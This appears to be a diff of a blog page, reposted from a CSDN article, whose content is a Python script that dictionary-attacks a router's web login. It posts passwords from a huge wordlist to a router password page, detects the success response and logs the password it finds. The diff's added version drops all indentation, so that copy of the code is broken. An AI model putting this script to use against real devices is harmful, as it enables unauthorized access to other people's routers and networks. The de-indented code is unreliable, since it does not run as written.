@@ -145,48 +145,46 @@ img.emoji {
 	<div class="entry-content">
 		<p>转<a href="https://blog.csdn.net/qq_21078159/article/details/106730677" target="_blank" rel="noopener">自</a></p>
 <p><span id="more-1271"></span></p>
-<pre class="pure-highlightjs"><code class="hljs dts">
-# -*- coding: utf-8 -*-
- 
+<pre class="pure-highlightjs"><code class="hljs dts"># -*- coding: utf-8 -*-
+
 import requests
 from itertools import islice
 import sys
 headers = {
-    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
-    'Cookie':'LOGINCOUNT=1; LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true'
+'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
+'Cookie':'LOGINCOUNT=1; LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true'
 }
- 
+
 def post(passwd):
-    data="psd="+passwd
-    res = requests.post(url="http://192.168.124.1/router_password_mobile.asp"
-                    ,data=data,headers=headers)
-    if('var resultInfo="true;0";' in res.text):
-        return True
-    else:
-        return False
-  
+data="psd="+passwd
+res = requests.post(url="http://192.168.124.1/router_password_mobile.asp"
+,data=data,headers=headers)
+if('var resultInfo="true;0";' in res.text):
+return True
+else:
+return False
+
 def record(content):
-    with open("E:/work/36.4GB-18_in_1.lst/passwd.txt", 'w') as file:
-        file.write(content)
-    
+with open("E:/work/36.4GB-18_in_1.lst/passwd.txt", 'w') as file:
+file.write(content)
+
 def readDic(skip):
-    linenum = skip - 1
-    with open("E:/work/36.4GB-18_in_1.lst/18_in_1.lst", 'r') as file:
-         for line in islice(file,skip,None):
-            linenum = linenum+1
-            line=line.replace('\n',"")
-            res=post(line)
-            print(str(linenum)+" "+line+" "+str(res), end="|")
-            if(res):
-                print("FOUND!")
-                record("FOUND! "+str(linenum)+" "+line+" "+str(res))
-                break
-            if(linenum%1000 == 0):
-                record(str(linenum)+" "+line+" "+str(res))
+linenum = skip - 1
+with open("E:/work/36.4GB-18_in_1.lst/18_in_1.lst", 'r') as file:
+for line in islice(file,skip,None):
+linenum = linenum+1
+line=line.replace('\n',"")
+res=post(line)
+print(str(linenum)+" "+line+" "+str(res), end="|")
+if(res):
+print("FOUND!")
+record("FOUND! "+str(linenum)+" "+line+" "+str(res))
+break
+if(linenum%1000 == 0):
+record(str(linenum)+" "+line+" "+str(res))
 if __name__ == "__main__":
-           
-    readDic(0)
-</code></pre>
+
+readDic(0)</code></pre>
 			</div>
 <!-- .entry-content -->
 
